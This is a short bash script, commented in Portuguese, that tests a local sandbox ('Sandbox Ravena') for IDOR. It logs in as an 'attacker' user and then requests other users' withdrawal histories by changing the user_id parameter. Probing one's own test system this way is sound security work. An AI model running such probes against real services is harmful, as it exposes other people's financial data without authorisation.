#!/bin/bash
# ============================================
# TESTE DE IDOR
# Sandbox Ravena
# ============================================

echo "============================================"
echo "  TESTE DE IDOR"
echo "============================================"

TARGET="http://localhost:8080"

echo "Alvo: $TARGET/api"
echo ""

# Fazer login para obter token
echo "1. Obtendo token de sessão..."
LOGIN_RESPONSE=$(curl -s -X POST "$TARGET/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"username": "attacker_001", "password": "test123"}')

TOKEN=$(echo $LOGIN_RESPONSE | python3 -c "import sys, json; print(json.load(sys.stdin).get('token', ''))" 2>/dev/null)

if [ -z "$TOKEN" ]; then
    echo "Não foi possível obter token"
    exit 1
fi

echo "Token obtido: ${TOKEN:0:20}..."
echo ""

# Testar IDOR - Tentar acessar dados de outro usuário
echo "2. Testando IDOR - Acessando dados de outros usuários..."
echo ""

# Tentar acessar saques de outros usuários
for user_id in 1 2 3 4 5; do
    echo "Tentando acessar dados do usuário $user_id..."
    curl -s -H "Authorization: Bearer $TOKEN" \
        "$TARGET/api/withdrawals/history?user_id=$user_id" \
        | python3 -m json.tool 2>/dev/null || echo "Acesso negado ou erro"
    echo "---"
done

echo ""
echo "Teste concluído!"
